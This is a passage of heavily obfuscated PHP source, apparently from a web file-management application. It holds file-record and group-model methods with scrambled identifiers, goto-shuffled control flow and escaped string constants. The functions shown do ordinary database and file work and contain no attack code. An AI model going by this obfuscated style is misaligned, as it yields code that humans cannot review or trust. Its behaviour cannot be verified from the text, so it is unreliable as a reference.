$this->addFileData($bÉëÒÊİğµ); CacheLock::unlock($Aá»—•‰×˜); goto B§½Ú‹‰‘; B§½Ú‹‰‘: return $Aæ‡ö†‰Ç¯; goto B„Õç¤Öæ; Eßä„Á½ç¶: $DĞÒíÃŠŠ† = IO::hashSimple($c¼¼ã™âÀ¸); $bàäæ¶ñŠÊ = IO::hashMd5($c¼¼ã™âÀ¸); $EÃ™ŠËõ‡Â = IO::size($c¼¼ã™âÀ¸); goto a×¸ÜÜ¦¤¡; B„Õç¤Öæ: } public function addFileMake($E»Í÷‹áßî, $eÃ’ëÀÛ„, $f”ÌŒæªŸå, $e‚×´—ù, $A–ã‚‰ç, $Dìä¤ÍÓ‰Ï) { goto CØ»øÜ¬²²; cÀŞíï¡æÈ: $D‘Øù÷å‚´ = get_path_this($A‚÷Ö‰™À); if ($Dìä¤ÍÓ‰Ï) { $bæ’ŞÁ®ƒ = IO::move($E»Í÷‹áßî, $D÷àÇÖÌ›Ø, !1, $D‘Øù÷å‚´); } else { $bæ’ŞÁ®ƒ = IO::copy($E»Í÷‹áßî, $D÷àÇÖÌ›Ø, !1, $D‘Øù÷å‚´); } if (!$bæ’ŞÁ®ƒ) { return !1; } goto E˜¼¢ª®å÷; E˜¼¢ª®å÷: $D„ù¡ªó­Ò = KodIO::defaultDriver(); $c×½ŞåîÊì = array($b±ãš¼¾¤¬[556] => $eÃ’ëÀÛ„, $b±ãš¼¾¤¬[1746] => 1, $b±ãš¼¾¤¬[421] => $A–ã‚‰ç, $b±ãš¼¾¤¬[781] => $D„ù¡ªó­Ò[$b±ãš¼¾¤¬[401]], $b±ãš¼¾¤¬[422] => $A‚÷Ö‰™À, $b±ãš¼¾¤¬[1747] => $f”ÌŒæªŸå, $b±ãš¼¾¤¬[1748] => $e‚×´—ù); return $c×½ŞåîÊì; goto B¤Œ·¥ÎÕ; CØ»øÜ¬²²: $b±ãš¼¾¤¬ =& $_SERVER[£¶ä½¶¢]; $A‚÷Ö‰™À = $this->createFileName($A–ã‚‰ç, $f”ÌŒæªŸå, $e‚×´—ù); $D÷àÇÖÌ›Ø = get_path_father($A‚÷Ö‰™À); goto cÀŞíï¡æÈ; B¤Œ·¥ÎÕ: } public function addFileCheckExist($FçÑÛ¨´, $cÂ–ô®¤«‡, $Fõ¼´£š) { $Cë ºğ°˜ =& $_SERVER[£¶ä½¶¢]; $DÕÚÅÌæ‚” = $this->findByHash($FçÑÛ¨´, $cÂ–ô®¤«‡); if (!$DÕÚÅÌæ‚”) { return !1; } $a¶¹ö¥ÉÊ = array($Cë ºğ°˜[1746] => intval($DÕÚÅÌæ‚”[$Cë ºğ°˜[1750]]) + 1, $Cë ºğ°˜[556] => $Fõ¼´£š); $this->where(array($Cë ºğ°˜[456] => $DÕÚÅÌæ‚”[$Cë ºğ°˜[455]]))->save($a¶¹ö¥ÉÊ); return $DÕÚÅÌæ‚”; } public function remove($e‘¿—ÀñÛ±) { $this->linkCountChange($e‘¿—ÀñÛ±, !1); $this->clearEmpty(); return !0; } public function linkAdd($bİ¹ÈŠé‘¶) { $this->linkCountChange($bİ¹ÈŠé‘¶, !0); } public function linkCountChange($A©ê¹´†Åà, $c×«Ù²ÑåÒ) { goto D¸Á˜ÖùôÚ; dÁ¿“ÄõÔ”: foreach ($A·—¹¸Â³ê as $fÀ–ºòËœÑ => $D‡¶Ø¶ˆ×) { $BÅ®Ç¢‰Î¦ = $D‡¶Ø¶ˆ× . $Bô®™ Ô÷–[43]; if (!$b¬£¨‘İ[$BÅ®Ç¢‰Î¦]) { $b¬£¨‘İ[$BÅ®Ç¢‰Î¦] = array(); } $b¬£¨‘İ[$BÅ®Ç¢‰Î¦][] = $fÀ–ºòËœÑ; } foreach ($b¬£¨‘İ as $D‡¶Ø¶ˆ× => $fğİ¶ÓÉÅÄ) { if (!$fğİ¶ÓÉÅÄ) { continue; } $D‡¶Ø¶ˆ× = $c×«Ù²ÑåÒ ? $D‡¶Ø¶ˆ× : -intval($D‡¶Ø¶ˆ×); $CéÇæĞ‹Ù = array($Bô®™ Ô÷–[455] => array($Bô®™ Ô÷–[17], $fğİ¶ÓÉÅÄ)); if ($D‡¶Ø¶ˆ× < 0) { $CéÇæĞ‹Ù[$Bô®™ Ô÷–[1750]] = array($Bô®™ Ô÷–[970], abs($D‡¶Ø¶ˆ×)); } $this->where($CéÇæĞ‹Ù)->setAdd($Bô®™ Ô÷–[1750], $D‡¶Ø¶ˆ×); } goto d•ÁÂ¬¸‚; D¸Á˜ÖùôÚ: $Bô®™ Ô÷– =& $_SERVER[£¶ä½¶¢]; if (!$A©ê¹´†Åà) { return; } if (!is_array($A©ê¹´†Åà)) { $A©ê¹´†Åà = array($A©ê¹´†Åà); } goto c…öãÂæ; c…öãÂæ: $A·—¹¸Â³ê = array(); foreach ($A©ê¹´†Åà as $fÀ–ºòËœÑ) { $BÅ®Ç¢‰Î¦ = $fÀ–ºòËœÑ . $Bô®™ Ô÷–[43]; if (!$A·—¹¸Â³ê[$BÅ®Ç¢‰Î¦]) { $A·—¹¸Â³ê[$BÅ®Ç¢‰Î¦] = 0; } $A·—¹¸Â³ê[$BÅ®Ç¢‰Î¦]++; } $b¬£¨‘İ = array(); goto dÁ¿“ÄõÔ”; d•ÁÂ¬¸‚: } public function findByHash($cœËÅ¢ã¾, $a›ó•ç¯öÒ = false) { $A¡øÑù¥© =& $_SERVER[£¶ä½¶¢]; if (!$cœËÅ¢ã¾ && !$a›ó•ç¯öÒ) { return !1; } $bæß¦ö‚›Û = array($A¡øÑù¥©[1747] => $cœËÅ¢ã¾); if ($a›ó•ç¯öÒ) { $bæß¦ö‚›Û = array($A¡øÑù¥©[1748] => $a›ó•ç¯öÒ); } return $this->order($A¡øÑù¥©[1751])->where($bæß¦ö‚›Û)->find(); } public function clearEmpty($eèàËÚÜ–Î = 0) { goto dó‰¬é“›‹; aŠ„Ğ‚ï“: foreach ($E‰’¤†ƒª as $B¨ˆœÏñºİ) { $fœ£Ú•áê->update(1); $this->resetFile($B¨ˆœÏñºİ); } $fœ£Ú•áê->end(); goto B«ó§¾„Ù; dó‰¬é“›‹: $AÃÏ‡à‹Ú± =& $_SERVER[£¶ä½¶¢]; $AŠÂá‹É’ = time() - 3600 * 24 * $eèàËÚÜ–Î; $aÒÈÒ’ãØÒ = $AÃÏ‡à‹Ú±[1752] . $AŠÂá‹É’; goto F•Éœ“Éà¿; F•Éœ“Éà¿: $E‰’¤†ƒª = $this->where($aÒÈÒ’ãØÒ)->select(); if (!$E‰’¤†ƒª) { return; } $fœ£Ú•áê = new Task($AÃÏ‡à‹Ú±[1753], $AÃÏ‡à‹Ú±[43], count($E‰’¤†ƒª)); goto aŠ„Ğ‚ï“; B«ó§¾„Ù: } public function resetFile($B¿áÈÒ‰‘) { goto fõ“‘ÀÍ½ï; f¢‡ ¾¤Ù: $d¤×Ÿ–¦Î = Model($FÇ™ä¸º²ò[1754])->where($e·‚‘‡ã¼¬)->count(); $E­œÀÅ°÷Î = intval($aâˆÀÆªö) + intval($d¤×Ÿ–¦Î); if ($E­œÀÅ°÷Î == 0) { IO::remove($B¿áÈÒ‰‘[$FÇ™ä¸º²ò[86]]); Model($FÇ™ä¸º²ò[1755])->delete($B¿áÈÒ‰‘[$FÇ™ä¸º²ò[455]]); $this->where($e·‚‘‡ã¼¬)->delete(); $this->metaSet($B¿áÈÒ‰‘[$FÇ™ä¸º²ò[455]], null, null); return; } goto BºŒìîŒ…; fõ“‘ÀÍ½ï: $FÇ™ä¸º²ò =& $_SERVER[£¶ä½¶¢]; $e·‚‘‡ã¼¬ = array($FÇ™ä¸º²ò[456] => $B¿áÈÒ‰‘[$FÇ™ä¸º²ò[455]]); $aâˆÀÆªö = Model($FÇ™ä¸º²ò[1203])->where($e·‚‘‡ã¼¬)->count(); goto f¢‡ ¾¤Ù; BºŒìîŒ…: if ($B¿áÈÒ‰‘[$FÇ™ä¸º²ò[1750]] != $E­œÀÅ°÷Î) { $this->where($e·‚‘‡ã¼¬)->save(array($FÇ™ä¸º²ò[1746] => $E­œÀÅ°÷Î)); } goto fá–Ò÷õ—; fá–Ò÷õ—: } public function storageInfo($fğ´¬ñ»Ê‹ = false) { goto aŠÁŠ¥à†—; aŠÁŠ¥à†—: $aÕÁğëˆÄ÷ =& $_SERVER[£¶ä½¶¢]; $FÊÕªâ‰ø‰ = $this->count() + 0.0; $d”¯Ğ¦Ä„¼ = 0; goto c½¯„®´¥; cë‰ŞòĞÁ×: for ($B¾ğ‚šª‘¡ = 0; $B¾ğ‚šª‘¡ < $FÊÕªâ‰ø‰; $B¾ğ‚šª‘¡ = $B¾ğ‚šª‘¡ + $A»“óğĞ±¨) { $f˜à»ÎËè = $this->limit($B¾ğ‚šª‘¡, $B¾ğ‚šª‘¡ + $A»“óğĞ±¨)->select(); foreach ($f˜à»ÎËè as $a‘Ø‡ÏæÄ) { $F†…ò©ƒïÕ += $a‘Ø‡ÏæÄ[$aÕÁğëˆÄ÷[88]] * $a‘Ø‡ÏæÄ[$aÕÁğëˆÄ÷[1750]]; $d”¯Ğ¦Ä„¼ += $a‘Ø‡ÏæÄ[$aÕÁğëˆÄ÷[88]] * ($a‘Ø‡ÏæÄ[$aÕÁğëˆÄ÷[1750]] - 1); $BÂêÆ§æ³¾ += $a‘Ø‡ÏæÄ[$aÕÁğëˆÄ÷[1750]]; } } $c½ä£íàÌ = array($aÕÁğëˆÄ÷[1756] => $F†…ò©ƒïÕ, $aÕÁğëˆÄ÷[1757] => $d”¯Ğ¦Ä„¼, $aÕÁğëˆÄ÷[1758] => $d”¯Ğ¦Ä„¼ / $F†…ò©ƒïÕ, $aÕÁğëˆÄ÷[92] => $FÊÕªâ‰ø‰, $aÕÁğëˆÄ÷[1759] => $BÂêÆ§æ³¾); return $c½ä£íàÌ; goto FÇ–ó¥îÊ; c½¯„®´¥: $F†…ò©ƒïÕ = 1; $BÂêÆ§æ³¾ = 0; $A»“óğĞ±¨ = 5000; goto cë‰ŞòĞÁ×; FÇ–ó¥îÊ: } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\x75\160"; protected $tableMeta = array("\x74\x61\x62\154\145\116\x61\x6d\145" => "\147\x72\x6f\165\x70\137\x6d\145\x74\141", "\155\145\x74\x61\x46\x69\145\154\144" => "\x67\162\x6f\165\160\111\x44"); protected function cacheFunctionAlias($E×†Ã³ÈÁº) { $b³Õ°Î =& $_SERVER[£¶ä½¶¢]; return array($b³Õ°Î[1760] => array($E×†Ã³ÈÁº[0], $b³Õ°Î[1761]), $b³Õ°Î[1762] => array($E×†Ã³ÈÁº[0], $b³Õ°Î[1761])); } protected function getInfo($A¡ÏïÉ½é³) { $Fàíƒöòâ® = $this->getInfoSimple($A¡ÏïÉ½é³); if (!$Fàíƒöòâ®) { return !1; } return $this->_listDataApplyItem($Fàíƒöòâ®); } protected function getInfoSimple($b‚¬‰Õ¿°½, $AÌ‡‡…©öÙ = false) { $døÇÅÅÓ =& $_SERVER[£¶ä½¶¢]; if ($AÌ‡‡…©öÙ) { $aÈ…³¯‡ã• = array($døÇÅÅÓ[1690] => intval($b‚¬‰Õ¿°½)); $dÀ‰ÀÚ¬Ç = $this->where($aÈ…³¯‡ã•)->find(); return is_array($dÀ‰ÀÚ¬Ç) ? $dÀ‰ÀÚ¬Ç : array(); } return $this->cacheFunctionGet($døÇÅÅÓ[1763], $b‚¬‰Õ¿°½); } protected function groupAdd($eâ‡ù¸¼â) { goto A¶›œ«ê; a›£ŠÏÓ¾¶: if ($CåùŒê·Å«[$F¨‚ï¨ï¡…[495]]) { $EÔ¹öŠĞ«‰ = $CåùŒê·Å«[$F¨‚ï¨ï¡…[495]] . $CåùŒê·Å«[$F¨‚ï¨ï¡…[1690]] . $F¨‚ï¨ï¡…[57]; } $DÀÉ‡õ¯ÑĞ = array($F¨‚ï¨ï¡…[421] => $this->groupNameAuto($eâ‡ù¸¼â[$F¨‚ï¨ï¡…[486]], $eâ‡ù¸¼â[$F¨‚ï¨ï¡…[38]]), $F¨‚ï¨ï¡…[402] => $eâ‡ù¸¼â[$F¨‚ï¨ï¡…[486]], $F¨‚ï¨ï¡…[561] => $EÔ¹öŠĞ«‰, $F¨‚ï¨ï¡…[1764] => $eâ‡ù¸¼â[$F¨‚ï¨ï¡…[1674]], $F¨‚ï¨ï¡…[1765] => 0, $F¨‚ï¨ï¡…[1694] => 0); if (isset($eâ‡ù¸¼â[$F¨‚ï¨ï¡…[1713]])) { $DÀÉ‡õ¯ÑĞ[$F¨‚ï¨ï¡…[1713]] = $eâ‡ù¸¼â[$F¨‚ï¨ï¡…[1713]]; } else { $eî©‹ˆ‘¹¸ = $this->max($F¨‚ï¨ï¡…[1713]); if (!$eî©‹ˆ‘¹¸) { $eî©‹ˆ‘¹¸ = 0; } $DÀÉ‡õ¯ÑĞ[$F¨‚ï¨ï¡…[1713]] = $eî©‹ˆ‘¹¸ + 1; } goto eİ÷¬Ó ›; A¶›œ«ê: $F¨‚ï¨ï¡… =& $_SERVER[£¶ä½¶¢]; if (!$eâ‡ù¸¼â[$F¨‚ï¨ï¡…[486]] && isset($eâ‡ù¸¼â[$F¨‚ï¨ï¡…[1690]]) && $eâ‡ù¸¼â[$F¨‚ï¨ï¡…[1690]] == 1) { if ($CåùŒê·Å« = $this->getInfoSimple($eâ‡ù¸¼â[$F¨‚ï¨ï¡…[1690]], !0)) { return $eâ‡ù¸¼â[$F¨‚ï¨ï¡…[1690]]; } } else { $CåùŒê·Å« = $this->getInfoSimple($eâ‡ù¸¼â[$F¨‚ï¨ï¡…[486]]); if (!$CåùŒê·Å«) { return !1; } } $EÔ¹öŠĞ«‰ = $F¨‚ï¨ï¡…[506]; goto a›£ŠÏÓ¾¶; A¨ğ›æ´Ø¤: if (isset($eâ‡ù¸¼â[$F¨‚ï¨ï¡…[1766]])) { $this->metaSet($F»ƒÕÄ†, array($F¨‚ï¨ï¡…[1766] => $eâ‡ù¸¼â[$F¨‚ï¨ï¡…[1766]], $F¨‚ï¨ï¡…[1767] => $eâ‡ù¸¼â[$F¨‚ï¨ï¡…[1767]])); unset($eâ‡ù¸¼â[$F¨‚ï¨ï¡…[1766]]); unset($eâ‡ù¸¼â[$F¨‚ï¨ï¡…[1767]]); } Model($F¨‚ï¨ï¡…[1203])->groupRootAdd($F»ƒÕÄ†); return $F»ƒÕÄ†; goto D‚¸Ü‰—; eİ÷¬Ó ›: if (!empty($eâ‡ù¸¼â[$F¨‚ï¨ï¡…[1690]])) { $DÀÉ‡õ¯ÑĞ[$F¨‚ï¨ï¡…[1690]] = $eâ‡ù¸¼â[$F¨‚ï¨ï¡…[1690]]; } $F»ƒÕÄ† = $this->add($DÀÉ‡õ¯ÑĞ); $this->setNamePinyin($F»ƒÕÄ†, $DÀÉ‡õ¯ÑĞ[$F¨‚ï¨ï¡…[38]]); goto A¨ğ›æ´Ø¤; D‚¸Ü‰—: } protected function groupEdit($FÑË»°è®Ô, $eí’ïŸçÔ) { goto aá…ß—ÍÓ; aá…ß—ÍÓ: $còÎ‡Ââ÷½ =& $_SERVER[£¶ä½¶¢]; $fù™íôÄ² = $this->getInfoSimple($FÑË»°è®Ô); if (!$fù™íôÄ²) { return !1; } goto e÷©¹ŒÊæ; CŠáôƒÜ: if (isset($eí’ïŸçÔ[$còÎ‡Ââ÷½[38]]) && $eí’ïŸçÔ[$còÎ‡Ââ÷½[38]] != $fù™íôÄ²[$còÎ‡Ââ÷½[38]]) { $this->_clearChildrenCache($fù™íôÄ²); } return $this->where(array($còÎ‡Ââ÷½[1768] => $FÑË»°è®Ô))->save($eí’ïŸçÔ); goto cäİ ¾“ ¬; e÷©¹ŒÊæ: if (!empty($eí’ïŸçÔ[$còÎ‡Ââ÷½[486]])) { $f‘°Ø³”ŸÁ = $this->getInfoSimple($eí’ïŸçÔ[$còÎ‡Ââ÷½[486]]); if (!$f‘°Ø³”ŸÁ) { return !1; } if ($fù™íôÄ²[$còÎ‡Ââ÷½[1690]] == $f‘°Ø³”ŸÁ[$còÎ‡Ââ÷½[1690]]) { return !1; } if ($eí’ïŸçÔ[$còÎ‡Ââ÷½[486]] != $fù™íôÄ²[$còÎ‡Ââ÷½[486]]) { if ($f‘°Ø³”ŸÁ[$còÎ‡Ââ÷½[495]] !== $fù™íôÄ²[$còÎ‡Ââ÷½[495]] && strpos($f‘°Ø³”ŸÁ[$còÎ‡Ââ÷½[495]], $fù™íôÄ²[$còÎ‡Ââ÷½[495]] . $fù™íôÄ²[$còÎ‡Ââ÷½[1690]] . $còÎ‡Ââ÷½[57]) === 0) { return !1; } $eí’ïŸçÔ[$còÎ‡Ââ÷½[561]] = $f‘°Ø³”ŸÁ[$còÎ‡Ââ÷½[495]] . $eí’ïŸçÔ[$còÎ‡Ââ÷½[486]] . $còÎ‡Ââ÷½[57]; $this->_changeChildLevel($fù™íôÄ², $f‘°Ø³”ŸÁ); } } if (isset($eí’ïŸçÔ[$còÎ‡Ââ÷½[38]])) { $this->setNamePinyin($FÑË»°è®Ô, $eí’ïŸçÔ[$còÎ‡Ââ÷½[38]]); } if (isset($eí’ïŸçÔ[$còÎ‡Ââ÷½[1766]])) { $this->metaSet($FÑË»°è®Ô, array($còÎ‡Ââ÷½[1766] => $eí’ïŸçÔ[$còÎ‡Ââ÷½[1766]], $còÎ‡Ââ÷½[1767] => $eí’ïŸçÔ[$còÎ‡Ââ÷½[1767]])); unset($eí’ïŸçÔ[$còÎ‡Ââ÷½[1766]]); unset($eí’ïŸçÔ[$còÎ‡Ââ÷½[1767]]); } goto CŠáôƒÜ; cäİ ¾“ ¬: } private function _clearChildrenCache($DğóÃœÁÊŸ) { $bÎìšåšÚö =& $_SERVER[£¶ä½¶¢]; $dñ°áˆ‡Š = array($bÎìšåšÚö[561] => array($bÎìšåšÚö[520], $DğóÃœÁÊŸ[$bÎìšåšÚö[495]] . $DğóÃœÁÊŸ[$bÎìšåšÚö[1690]] . $bÎìšåšÚö[521])); $e³¹ßî§¨ = $this->field($bÎìšåšÚö[1690])->where($dñ°áˆ‡Š)->select(); foreach ($e³¹ßî§¨ as $B¶¦óË¦í) { $this->cacheFunctionClear($bÎìšåšÚö[1769], $B¶¦óË¦í[$bÎìšåšÚö[1690]]); $this->cacheFunctionClear($bÎìšåšÚö[1763], $B¶¦óË¦í[$bÎìšåšÚö[1690]]); } } private function _changeChildLevel($d†à…‡˜±İ, $B±ÇéíÁĞ, $bëïŸĞÚ²§ = false) { goto A¿³Õ±Øø; aªŒª¼ÕÏ¥: if ($bëïŸĞÚ²§) { $e£ó¦ôÆã = $B±ÇéíÁĞ[$Fœ¤™ŠÔ[495]] . $B±ÇéíÁĞ[$Fœ¤™ŠÔ[1690]] . $Fœ¤™ŠÔ[57]; } $aßî•ØÔØò = array($Fœ¤™ŠÔ[561] => array($Fœ¤™ŠÔ[520], $d†à…‡˜±İ[$Fœ¤™ŠÔ[495]] . $d†à…‡˜±İ[$Fœ¤™ŠÔ[1690]] . $Fœ¤™ŠÔ[521])); $AõßøÓ½Ú“ = array($Fœ¤™ŠÔ[561] => array($Fœ¤™ŠÔ[569], "\162\x65\x70\154\x61\x63\x65\50\x70\x61\162\145\x6e\x74\x4c\x65\x76\145\x6c\54\47{$aß„´‹¼ƒ}\x27\54\47{$e£ó¦ôÆã}\x27\51")); goto Aù·­Ë¹®‡; Aù·­Ë¹®‡: $this->_clearChildrenCache($d†à…‡˜±İ); $this->where($aßî•ØÔØò)->data($AõßøÓ½Ú“)->save(); goto F¤ÚÃŠ¼š; A¿³Õ±Øø: $Fœ¤™ŠÔ =& $_SERVER[£¶ä½¶¢]; $aß„´‹¼ƒ = $d†à…‡˜±İ[$Fœ¤™ŠÔ[495]] . $d†à…‡˜±İ[$Fœ¤™ŠÔ[1690]] . $Fœ¤™ŠÔ[57]; $e£ó¦ôÆã = $B±ÇéíÁĞ[$Fœ¤™ŠÔ[495]] . $B±ÇéíÁĞ[$Fœ¤™ŠÔ[1690]] . $Fœ¤™ŠÔ[57] . $d†à…‡˜±İ[$Fœ¤™ŠÔ[1690]] . $Fœ¤™ŠÔ[57]; goto aªŒª¼ÕÏ¥; F¤ÚÃŠ¼š: } public function setNamePinyin($E´™Îé¨ñÎ, $fòãÜ¦·š± = false) { $B—ª—¾ùÙÁ =& $_SERVER[£¶ä½¶¢]; if (!$fòãÜ¦·š±) { $fã•‰½¼Õ¼ = $this->getInfoSimple($E´™Îé¨ñÎ); $fòãÜ¦·š± = $fã•‰½¼Õ¼[$B—ª—¾ùÙÁ[38]]; } if (!Input::check($fòãÜ¦·š±, $B—ª—¾ùÙÁ[564])) { $this->metaSet($E´™Îé¨ñÎ, $B—ª—¾ùÙÁ[452], null); $this->metaSet($E´™Îé¨ñÎ, $B—ª—¾ùÙÁ[451], null); return; } $eìÛèÖ‹Ó„ = array($B—ª—¾ùÙÁ[452] => str_replace($B—ª—¾ùÙÁ[60], $B—ª—¾ùÙÁ[43], Pinyin::encode($fòãÜ¦·š±)), $B—ª—¾ùÙÁ[451] => Pinyin::encode($fòãÜ¦·š±, $B—ª—¾ùÙÁ[565])); $this->metaSet($E´™Îé¨ñÎ, $eìÛèÖ‹Ó„); } protected function groupStatus($D…‡éºøò», $d ›¼ÖÓÉ) { goto bˆ•Ù°À…¹; B‘“Ó˜ÁÇ: if ($d ›¼ÖÓÉ == $fÍî‚Â†Ó[97]) { $f¯¯ø¬«¢ = $this->parentLevelArray($c‹µØ°Ûğ„[$fÍî‚Â†Ó[495]]); } else { $Føî´£«Ã = array($fÍî‚Â†Ó[561] => array($fÍî‚Â†Ó[520], $c‹µØ°Ûğ„[$fÍî‚Â†Ó[495]] . $c‹µØ°Ûğ„[$fÍî‚Â†Ó[1690]] . $fÍî‚Â†Ó[521])); $f¯¯ø¬«¢ = $this->where($Føî´£«Ã)->field($fÍî‚Â†Ó[1690])->select(); $f¯¯ø¬«¢ = array_to_keyvalue($f¯¯ø¬«¢, $fÍî‚Â†Ó[43], $fÍî‚Â†Ó[1690]); } $f¯¯ø¬«¢[] = $c‹µØ°Ûğ„[$fÍî‚Â†Ó[1690]]; $eÉÒĞ“–Ü² = array(); goto FÀõÂÙà×¼; FÀõÂÙà×¼: foreach ($f¯¯ø¬«¢ as $D…‡éºøò») { $eÉÒĞ“–Ü²[] = array($fÍî‚Â†Ó[1690] => $D…‡éºøò», $fÍî‚Â†Ó[103] => $fÍî‚Â†Ó[718], $fÍî‚Â†Ó[381] => $d ›¼ÖÓÉ); } return Model($fÍî‚Â†Ó[1770])->addAll($eÉÒĞ“–Ü², array(), !0); goto d¯¯ ãË—·; bˆ•Ù°À…¹: $fÍî‚Â†Ó =& $_SERVER[£¶ä½¶¢]; $c‹µØ°Ûğ„ = $this->getInfoSimple($D…‡éºøò»); if (!$c‹µØ°Ûğ„) { return !1; } goto B‘“Ó˜ÁÇ; d¯¯ ãË—·: } protected function groupRemove($F‚Îäˆßóø) { goto EÜ”ù­; fõ½ëç¦èÆ: $this->where(array($F†Ô„æêº[486] => $F‚Îäˆßóø))->save(array($F†Ô„æêº[486] => $B‰Ö‰˜ÒÓˆ[$F†Ô„æêº[486]])); Model($F†Ô„æêº[1770])->where($fê²Ûô‰àí)->delete(); Model($F†Ô„æêº[1771])->where($fê²Ûô‰àí)->delete(); goto C°‘ÃîÂ©ª; EÜ”ù­: $F†Ô„æêº =& $_SERVER[£¶ä½¶¢]; $fê²Ûô‰àí = array($F†Ô„æêº[1690] => $F‚Îäˆßóø); $B‰Ö‰˜ÒÓˆ = $this->where($fê²Ûô‰àí)->find(); goto E‡ÁŞŞ¿È; E‡ÁŞŞ¿È: if (!$B‰Ö‰˜ÒÓˆ || $B‰Ö‰˜ÒÓˆ[$F†Ô„æêº[486]] == 0) { return !1; } $EĞÊé¢  = $this->getInfoSimple($B‰Ö‰˜ÒÓˆ[$F†Ô„æêº[486]]); $this->_changeChildLevel($B‰Ö‰˜ÒÓˆ, $EĞÊé¢ , !0); goto fõ½ëç¦èÆ; C°‘ÃîÂ©ª: Model($F†Ô„æêº[798])->groupRootRemove($F‚Îäˆßóø); return $this->where($fê²Ûô‰àí)->delete(); goto B‚¦¡Æå²; B‚¦¡Æå²: } protected function groupSort($B¯ä®ƒï±Û) { $b±ˆóÒàĞ› =& $_SERVER[£¶ä½¶¢]; $E¤³òÎÈ© = array(); foreach ($B¯ä®ƒï±Û as $B¬‚…‘Åõ => $fÇÄ¦‚ƒÅ–) { $E¤³òÎÈ©[] = array($b±ˆóÒàĞ›[1690], $fÇÄ¦‚ƒÅ–, $b±ˆóÒàĞ›[1713], $B¬‚…‘Åõ + 1); } $this->saveAll($E¤³òÎÈ©); } public function listData() { $DÏÜôÍ…‘Ã = $this->_makeOrder()->selectPage(50); $this->_listDataApply($DÏÜôÍ…‘Ã[$_SERVER[£¶ä½¶¢][376]]); return $DÏÜôÍ…‘Ã; } private function _makeOrder($c×Ç†¯–Ü‹ = '') { goto DÙ»² ªğ¿; dá›Î¶¸‰É: $c×Ç†¯–Ü‹ = $c×Ç†¯–Ü‹ . "{$DÄàî©øİ¾}\40{$EŠ˜Ç¿éÆÑ}\54\x20\147\x72\157\x75\x70\x49\104\40\x61\163\x63"; return $this->order($c×Ç†¯–Ü‹); goto DÀÖò“ÕÈÚ; f•İœ»çŸ¡: $DÄàî©øİ¾ = Input::get($C’¨†š”ôÓ[443], $C’¨†š”ôÓ[17], $C’¨†š”ôÓ[1694], $eğ Ä¸ƒ); $EŠ˜Ç¿éÆÑ = Input::get($C’¨†š”ôÓ[444], $C’¨†š”ôÓ[17], $C’¨†š”ôÓ[1772], array($C’¨†š”ôÓ[1772], $C’¨†š”ôÓ[438])); $EŠ˜Ç¿éÆÑ = $b«˜†ŞÖ¹ƒ[$EŠ˜Ç¿éÆÑ]; goto dá›Î¶¸‰É; DÙ»² ªğ¿: $C’¨†š”ôÓ =& $_SERVER[£¶ä½¶¢]; $eğ Ä¸ƒ = array($C’¨†š”ôÓ[1690], $C’¨†š”ôÓ[38], $C’¨†š”ôÓ[1676], $C’¨†š”ôÓ[204]); $b«˜†ŞÖ¹ƒ = array($C’¨†š”ôÓ[436] => $C’¨†š”ôÓ[437], $C’¨†š”ôÓ[438] => $C’¨†š”ôÓ[439]); goto f•İœ»çŸ¡; DÀÖò“ÕÈÚ: } public function listChild($eòÊßá“Ö) { $CëŒÏ§ºå‡ =& $_SERVER[£¶ä½¶¢]; $Aæ‡Ë×·³½ = $this->where(array($CëŒÏ§ºå‡[486] => $eòÊßá“Ö))->_makeOrder()->selectPage(200); $this->_listDataApply($Aæ‡Ë×·³½[$CëŒÏ§ºå‡[376]]); return $Aæ‡Ë×·³½; } public function listByID($B¿†ÔäØ­) { $cÏåÛßÜÑ =& $_SERVER[£¶ä½¶¢]; if (!$B¿†ÔäØ­) { return array(); } $E¼ùÏæª×Ó = array($cÏåÛßÜÑ[1690] => array($cÏåÛßÜÑ[17], $B¿†ÔäØ­)); $E˜˜¡§ßƒ§ = $this->where($E¼ùÏæª×Ó)->select(); $this->_listDataApply($E˜˜¡§ßƒ§); return $E˜˜¡§ßƒ§; } public function listSearch($DÖ•âÑ») { goto CÊ¸‘Ãèã—; BÌã˜†Ç: if (!trim($Bß˜ä†ç·)) { return !1; } $Bß˜ä†ç· = str_replace($F®ƒ¤íĞŠ[1775], $F®ƒ¤íĞŠ[1776], $Bß˜ä†ç·); $Fø“ê”ÇÓ = array($F®ƒ¤íĞŠ[1690] => array($F®ƒ¤íĞŠ[388], "{$Bß˜ä†ç·}\x25"), $F®ƒ¤íĞŠ[38] => array($F®ƒ¤íĞŠ[388], "\45{$Bß˜ä†ç·}\x25"), $F®ƒ¤íĞŠ[955] => $F®ƒ¤íĞŠ[1777]); goto Bè˜Š–Íö…; d¥Äó¥œ©à: return $bøÏÙãæ›; goto f¼È»óèæ; Bè˜Š–Íö…: if ($E£»è”ÜÕÁ) { $fİØ’˜Èİ = $this->getInfoSimple($E£»è”ÜÕÁ); $Eó¬¨ù‰¥î = $fİØ’˜Èİ[$F®ƒ¤íĞŠ[495]] . $E£»è”ÜÕÁ . $F®ƒ¤íĞŠ[521]; $Fø“ê”ÇÓ = array($Fø“ê”ÇÓ, array($F®ƒ¤íĞŠ[495] => array($F®ƒ¤íĞŠ[388], $Eó¬¨ù‰¥î))); } $Fø“ê”ÇÓ = $this->parseWhereLike($Fø“ê”ÇÓ); $bøÏÙãæ› = $this->_makeOrder()->where($Fø“ê”ÇÓ)->selectPage(20); goto eÉœ»˜ß¶ß; eÉœ»˜ß¶ß: $bøÏÙãæ› = $bøÏÙãæ› ? $bøÏÙãæ› : array($F®ƒ¤íĞŠ[376] => array(), $F®ƒ¤íĞŠ[373] => array()); if (!$bøÏÙãæ› || count($bøÏÙãæ›[$F®ƒ¤íĞŠ[376]]) < 5 && Input::check($Bß˜ä†ç·, $F®ƒ¤íĞŠ[325])) { goto Dô±„Çˆ; Dô±„Çˆ: $AœõÍšöÂ = $this->groupChildrenAll($E£»è”ÜÕÁ); $aØñ¬ªäã = $this->_searchFromMeta($F®ƒ¤íĞŠ[451], $Bß˜ä†ç·, 10, $AœõÍšöÂ); $eÓ„õ˜…ßš = $this->_searchFromMeta($F®ƒ¤íĞŠ[452], $Bß˜ä†ç·, 10, $AœõÍšöÂ); goto FòÅ©Ü›ÖÏ; FòÅ©Ü›ÖÏ: $EÁÕŸ÷ÏÙ§ = array_merge($aØñ¬ªäã, $eÓ„õ˜…ßš, $bøÏÙãæ›[$F®ƒ¤íĞŠ[376]]); $bøÏÙãæ›[$F®ƒ¤íĞŠ[376]] = array_unique_by_key($EÁÕŸ÷ÏÙ§, $F®ƒ¤íĞŠ[1690]); 